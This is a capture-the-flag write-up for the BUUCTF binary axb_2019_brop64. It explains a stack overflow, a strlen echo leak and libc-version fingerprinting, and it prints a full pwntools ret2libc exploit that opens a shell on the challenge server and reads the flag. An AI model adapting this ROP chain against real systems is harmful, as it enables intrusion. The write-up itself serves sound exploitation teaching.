# axb_2019_brop64 — ret2libc and the libc-Subversion Trap

> **Flag**: `flag{1dc952c2-90a8-4512-bc81-ab8f4e7677a8}`
>
> A textbook stack overflow → ret2libc, but with two interesting twists: (1) a partial `memset` leaves 8 bytes of stack data unscrubbed before the read, giving you a free leak primitive via `strlen` echoing past your input; and (2) the standard ret2libc path costs you an evening if you guess the libc version wrong. The latter taught me more than the former.

## 0. File overview

| Field | Value |
|---|---|
| File | `axb_2019_brop64` |
| Format | ELF 64-bit LSB executable, x86-64, dynamically linked |
| Image base | `0x400000` (No PIE) |
| Protections | `Partial RELRO / NX enabled / No Canary / No PIE` |
| Remote | `node5.buuoj.cn:28489` (BUUCTF) |
| Remote libc | **libc 2.23 (BUU's challenge-page bundle)** — not 2.27 as I first assumed |

`checksec`:

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

NX + No Canary + No PIE is the textbook "go straight to ROP" combo — you don't need to leak any binary base, but you do need to leak libc.

## 1. The vulnerable function

`main` at `0x4007d6` is a thin wrapper:

```c
puts("Hello, I am a computer Repeater updated...");
puts("So I'll answer whatever you say!");
repeater();
puts("Goodbye!");
return 0;
```

The interesting work is in `repeater` at `0x400845`:

```c
__int64 repeater(void) {
    char s[208];                     // [rbp - 0xD0]
    printf("Please tell me:");
    memset(s, 0, 0xC8u);             // ← clears only 200 of the 208 bytes
    read(0, s, 0x400u);              // ← can read 1024 bytes — overflow

    if (!strcmp(s, "If there is a chance,I won't make any mistake!\n")) {
        puts("Wish you happy everyday!");
    } else {
        printf("Repeater:");
        v1 = strlen(s);              // ← strlen runs to first NUL
        write(1, s, v1);             // ← echo input back up to that NUL
    }
    return 0;
}
```

Two things to notice:

1. **`memset` only clears 200 bytes**, but the buffer is 208 bytes. The trailing 8 (`s[200..208]`) keep whatever stack garbage was there before. If your input is exactly 200 bytes with no NUL, `strlen(s)` will run past your bytes, hit that garbage, and may continue further — **into the saved RBP and saved RIP** — until it finds a NUL. Then `write` echoes all of that. Free leak primitive.
2. **`read` is 1024 bytes, buffer is 208.** Standard stack overflow — `0xD0 + 8 = 0xD8` to reach saved RIP.

## 2. Stack layout inside `repeater`

```
high addresses
     │  …                       │
     ├──────────────────────────┤
     │  saved RIP   [rbp + 8]   │  ← overwrite target for ROP
     ├──────────────────────────┤
     │  saved RBP   [rbp]       │  ← 8 bytes
     ├──────────────────────────┤  ← rbp
     │  s[200 .. 208]           │  ← memset DIDN'T clear this — leak surface
     ├──────────────────────────┤
     │  s[  0 .. 200]           │  ← memset cleared
     └──────────────────────────┘  ← rsp = rbp - 0xD0 = &s[0]
low addresses
```

Padding to saved RIP: `0xD0 + 8 = 0xD8 = 216` bytes.

## 3. Two primitives, one chosen

### Primitive A — leak via the strlen echo (interesting, unused)

Send exactly `0xC8 = 200` bytes of input with no NUL and no `\n`. After `read`, `s[0..200]` holds your bytes; `s[200..208]` holds the original stack garbage (its first byte is usually non-zero). `strlen(s)` walks past 200 looking for a NUL byte; it finds one somewhere in `s[200..208]`, in `saved RBP`, or in `saved RIP`. Whatever bytes it walks past get echoed back. With careful framing you can leak the saved RBP — a stack address — defeating any stack-related ASLR.

I didn't use this. The standard ret2libc path is cleaner and doesn't require careful framing of input length.

### Primitive B — stack overflow → ret2libc (the actual solve)

Two-shot:

- **Shot 1**: payload that calls `puts(puts@got)` and then returns to `main`. The leaked address is `puts` in libc; subtract its symbol offset to get `libc_base`.
- **Shot 2**: payload that calls `system("/bin/sh")` using addresses computed from `libc_base`.

Returning to `main` is what makes the two shots possible — `main` calls `repeater` again, giving us a second `read` and a second ROP chain.

## 4. Six facts to gather before writing exp.py

A pwn challenge collapses to having these six pieces of information. Right column is this binary's values:

| Item | Tool | Value | Purpose |
|---|---|---|---|
| Protections | `checksec` | NX / No PIE / No Canary / Partial RELRO | Pick the path: with PIE you'd need binary base first; with canary, leak the cookie; this one — neither, go straight to ROP |
| Overflow distance | IDA: buffer vs read | 0xD0 vs 0x400 | Padding to saved RIP = `0xD0 + 8 = 0xD8` |
| Key function addresses | `nm` / IDA | `main = 0x4007d6`, `repeater = 0x400845` | After leak, return to `main` to re-trigger `repeater` |
| PLT / GOT | pwntools `elf.plt` / `elf.got` | `puts_plt`, `puts_got` | `puts(puts_got)` to leak |
| ROP gadgets | `ROPgadget` | **`pop_rdi = 0x400963`, `ret = 0x400629`** | Set `rdi`; align stack before `system` |
| Remote libc | challenge page first, else fingerprint by leak | **BUU-bundled `libc-2.23-64bit.so`** | Compute `system` and `/bin/sh` offsets |

Critically: my static notes had `pop_rdi = 0x400a13` and `ret = 0x4006b9`, both **wrong**. I'd written them from memory before checking. Always run `ROPgadget` and copy actual bytes — never write addresses from memory.

```bash
ROPgadget --binary axb_2019_brop64 | grep -E ': (pop rdi|ret)$' | head
```

## 5. exp.py, decision by decision

Each line that looks "extra" is there for a specific reason:

```python
context(arch='amd64', os='linux', log_level='debug')
```

`log_level='debug'` is **mandatory during development**. It hexdumps every `send`/`recv`, and 70% of pwn bugs live in the I/O stream. Switch to `info` only after the exploit works.

```python
if args.REMOTE:
    io = remote('node5.buuoj.cn', 28489)
else:
    io = process([LD, BIN], env={'LD_PRELOAD': LIBC})
```

`args.REMOTE` is pwntools's command-line switch — `python exp.py REMOTE` runs against the remote, no arg runs locally. **Always make the local exploit work before switching to remote.** Remote adds banner timing, network jitter, and possible libc-version mismatches — all noise that should be eliminated only after the ROP chain itself is verified correct.

```python
LIBC = '/root/glibc-all-in-one/libs/libc-2.23-64bit.so'                # BUU's bundled libc
LD   = '/root/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so'    # local-only loader

io = process([LD, BIN], env={'LD_PRELOAD': LIBC})
```

Why not `process(BIN)`? Because the system libc on my Kali is glibc 2.40+, with very different offsets from the remote's 2.23. I force the right libc via `LD_PRELOAD`, and a compatible loader via the explicit interpreter argument, so that **leaks computed locally produce the same offsets as the remote**. Once it works locally, flipping the `REMOTE` switch is a no-op.

```python
if args.GDB:
    gdb.attach(io, 'b *0x4008f4\nc')
```

`python exp.py GDB` auto-attaches gdb with a breakpoint at `repeater`'s `ret` instruction. **Always set a breakpoint at the `ret` you're about to redirect**, to confirm the bytes on the stack at that exact moment match what you intended.

```python
assert (libc_base & 0xFFF) == 0, 'libc_base not page aligned — leak parsing wrong'
```

Lifesaver assertion. Linux `mmap` loads libc at a page boundary, so **the bottom 12 bits of `libc_base` are always 0**. If they're not, either I parsed the leaked bytes wrong (off-by-one), or the libc version is wrong (offset mismatch). This assert caught the libc-2.27-vs-2.23 mismatch on the very first run.

## 6. Phased debugging methodology

This is general — not specific to this challenge. **Before each `send`, ask: what am I confirming with this packet?**

```
Phase 0: gather all static facts (don't send anything yet)
   ↓
Phase 1: send shot 1, look at the leak only
   - did I send exactly 0xD8 + len(ROP) bytes?
   - did the echo come back at the size I expected (0xDB)?
   - does the leaked address have a libc-shaped low 12 bits (e.g. 0x...690)?
   - does libc_base satisfy `& 0xFFF == 0`? (assert)
   ↓
Phase 2: add shot 2, but DELIBERATELY OMIT the ret-alignment gadget first
   - if it works without — libc happened to not need alignment
   - if it SIGSEGVs at the `movaps` instruction inside do_system — add the ret gadget
   - this is to *see* the alignment trap with your own eyes, not just to follow advice
   ↓
Phase 3: switch to remote — possible new failure modes
   - banner string differs → recvuntil pattern needs adjusting
   - libc version differs → recompute offsets
   - network latency → add timeouts on recv
```

Anti-pattern: write a 100-line full exploit, run it once, see "exploit failed", stare at stderr. When that happens, retreat to Phase 1 and verify the leak in isolation before doing anything else.

## 7. The libc-version saga (the main lesson)

This challenge bit me twice on libc, with a different signal each time. Reading those signals is the real skill.

### Failure 1 — `libc_base` not page-aligned

Initial assumption: BUU = Ubuntu 18 → libc 2.27. So:

```
puts @ 0x7f32b3bb7690
libc_base = puts_addr - libc_2.27.symbols['puts']
          = 0x7f32b3bb7690 - 0x809c0
          = 0x7f32b3b36cd0           ← bottom 12 bits = 0xcd0, NOT aligned
```

Signal: `libc_base & 0xFFF != 0` → the libc symbol offset is wrong → **wrong libc version**.

How to fingerprint the right one: the leaked `puts` address ends in `0x...690`. The bottom 12 bits of any libc symbol are unaffected by ASLR — they're a fingerprint of the libc build. Query libc.rip:

```bash
curl -s https://libc.rip/api/find -X POST \
     -H "Content-Type: application/json" \
     -d '{"symbols": {"puts": "690"}}'
```

Returned candidates: all 2.23 (Ubuntu 16). Not 2.27 as I had assumed.

### Failure 2 — right libc family, wrong subversion

I switched to `libc6_2.23-0ubuntu4_amd64` from `glibc-all-in-one`:

```
puts @ 0x7f85b7b16690
libc_base   = 0x7f85b7aa7000      ← bottom 12 bits = 0x000 ✓ aligned
system      = 0x7f85b7aec390
/bin/sh     = 0x7f85b7c33177
```

Leak parses correctly. Assertion passes. But after the second shot:

```
sh: 1: \x8a\xfa\xff: not found
```

This error message has to be read carefully:

- "`sh: 1:`" — `sh` started successfully. `system` ran. The shell launched.
- "`: not found`" — `sh` tried to execute a command that doesn't exist on PATH.
- The command name is `\x8a\xfa\xff` — three non-ASCII bytes, **not** `/bin/sh`.

Translation: `system` was called with an `rdi` pointing somewhere in libc, but that "somewhere" wasn't where `/bin/sh` actually lives in *this remote's* libc. The byte sequence sitting at our computed `binsh` address was `\x8a\xfa\xff…`, which is whatever code or data happens to live at that offset.

Locking onto the cause: between subversions of glibc 2.23 (`ubuntu4`, `ubuntu7`, `ubuntu9`, …), `puts` and `system` often have **identical offsets** (so `libc_base` computes the same), but the **`/bin/sh` string** in `.rodata` is at **different offsets** — minor build changes reorder the read-only data segment.

- ubuntu4: `/bin/sh` at libc offset `0x18c177`
- BUU's bundled libc: `/bin/sh` at offset `0x18cd57`

This is an easy mistake: libc.rip's "match by single-symbol bottom-12-bits" is good enough to pick the major version (2.23 vs 2.27), but **not good enough to disambiguate subversions when the strings have moved**.

### Resolution

BUU's challenge pages always include a `libc.so.6` download for the exact remote build. Use it.

```python
LIBC = '/root/glibc-all-in-one/libs/libc-2.23-64bit.so'   # BUU's original
```

One run, flag printed.

## 8. Echo length — the byte-precise calculation

To parse the leak correctly I needed to know exactly how many bytes the `Repeater:` echo would consume before the `puts(puts_got)` output appeared on the wire.

Shot 1's payload tail:

```
[ 0xD0 'A' ] [ 0x08 'B' ] [ p64(pop_rdi)=0x400963 ] [ p64(puts_got) ] [ p64(puts_plt) ] [ p64(main) ]
```

In bytes:

```
0x00..0xD0:   'A' × 208
0xD0..0xD8:   'B' × 8
0xD8..0xE0:   \x63 \x09 \x40 \x00 \x00 \x00 \x00 \x00     ← p64(pop_rdi)
0xE0..0xE8:   p64(puts_got)
…
```

`strlen(s)` walks until it finds the first NUL byte. From `&s[0]`:

- `0x00..0xD0` — all `'A'`, no NUL
- `0xD0..0xD8` — all `'B'`, no NUL
- `0xD8..0xDB` — first 3 bytes of `pop_rdi` = `\x63 \x09 \x40`, no NUL
- byte `0xDB` — 4th byte of `pop_rdi` = `\x00` — **strlen stops here**

Echo length = `0xDB = 219` bytes.

So the recv pattern is:

```python
io.recvuntil(b'Repeater:')
echo = io.recv(0xDB)              # consume the echo exactly
leaked = io.recvline().strip()    # next line is puts() output
puts_addr = u64(leaked.ljust(8, b'\x00'))
```

If you used `recvline()` instead of `recv(0xDB)`, you'd consume up to a `\n` — and there's no `\n` in the echo, so `recvline()` would also pull in part of the leaked-address bytes, and `u64` would parse garbage.

**General rule**: when the payload contains a ROP chain (whose high bytes are mostly `0x00`), echo length = `padding_len + (offset of first NUL byte in the chain)`. Compute, don't guess.

## 9. Final exp.py

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

BIN  = './axb_2019_brop64'
LIBC = '/root/glibc-all-in-one/libs/libc-2.23-64bit.so'
LD   = '/root/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so'

elf  = context.binary = ELF(BIN)
libc = ELF(LIBC)

if args.REMOTE:
    io = remote('node5.buuoj.cn', 28489)
else:
    io = process([LD, BIN], env={'LD_PRELOAD': LIBC})
    if args.GDB:
        gdb.attach(io, '''
            b *0x4008f4
            c
        ''')

pop_rdi  = 0x400963
ret_gad  = 0x400629
main     = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

# ===== Shot 1: leak puts =====
payload1 = b'A' * 0xD0 + b'B' * 8
payload1 += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
payload1 += p64(main)

io.recvuntil(b'tell me:')
io.send(payload1)

io.recvuntil(b'Repeater:')
echo   = io.recv(0xDB)                 # exactly 219 bytes — see § 8
leaked = io.recvline().strip()
puts_addr = u64(leaked.ljust(8, b'\x00'))
log.success(f'puts @ {hex(puts_addr)}')

libc_base   = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh       = libc_base + next(libc.search(b'/bin/sh'))
log.success(f'libc base @ {hex(libc_base)}')

assert (libc_base & 0xFFF) == 0, 'libc_base not page aligned — leak parsing wrong'

# ===== Shot 2: getshell =====
payload2 = b'A' * 0xD0 + b'B' * 8
payload2 += p64(ret_gad)                # 16-byte align for system's movaps
payload2 += p64(pop_rdi) + p64(binsh) + p64(system_addr)

io.recvuntil(b'tell me:')
io.send(payload2)

io.recvuntil(b'Repeater:')
io.recv(0xDB, timeout=3)                # consume echo of shot 2

# Drive the shell programmatically
io.sendline(b'echo PWNED && cat /flag && cat flag && ls')
io.recvuntil(b'PWNED', timeout=5)
out = io.recvall(timeout=3)
log.success(f'shell output:\n{out.decode(errors="replace")}')
io.interactive()
```

Output:

```
flag{1dc952c2-90a8-4512-bc81-ab8f4e7677a8}
```

## 10. Anti-patterns to avoid

1. **"Should be fine."** Every "should" must become an `assert`. The `(libc_base & 0xFFF) == 0` check saved me twice.
2. **Copying someone else's exploit template verbatim.** The gadget addresses in the template are *that* binary's, not yours. Always run `ROPgadget` on your own target.
3. **Endlessly trying different `LD_PRELOAD`s when the remote fails.** Instead, fingerprint the libc precisely from the leak, then fetch the exact build.
4. **Reading `sh: not found` as "the remote has no sh installed".** Wrong. The error came **from** our remote `sh`, which received a corrupt command string because `/bin/sh`'s offset in libc was off.
5. **`io.interactive()` without auto-verification.** The remote may close the connection before you can type anything. Better to drive the shell programmatically, verify the flag bytes came back, and then drop into interactive only if needed.

## 11. Reusable checklist

```
□ checksec — confirm protections
□ IDA — read the vulnerable function: buffer size, read length, key addresses → padding distance
□ ROPgadget — pop_rdi and ret (do NOT write addresses from memory)
□ Remote libc: challenge page first, then ~/glibc-all-in-one, then libc.rip
□ exp.py uses args.REMOTE switch (local first, remote later)
□ Local with LD_PRELOAD against the remote libc — offsets must agree
□ assert libc_base & 0xFFF == 0
□ Try shot 2 without ret-alignment first; add if movaps SIGSEGVs
□ Drive the shell programmatically and verify flag bytes; don't just io.interactive()
□ When debugging: (a) is leak page-aligned? (b) does sh's "not found" mention non-ASCII bytes? (c) is the echo length right?
```

## 12. Three values I had wrong in my static notes

| Item | Original notes value | Tested value |
|---|---|---|
| `pop_rdi` | `0x400a13` | **`0x400963`** |
| `ret` gadget | `0x4006b9` | **`0x400629`** |
| Remote libc | assumed 2.27 (Ubuntu 18) | **actually 2.23 (Ubuntu 16)** |

The third one is the biggest lesson: **always use the libc bundled on the challenge page, never guess by Ubuntu subversion**. `puts`'s bottom 12 bits give you the major version; minor builds within the same major share `puts`/`system` offsets but disagree on `/bin/sh`'s string offset.
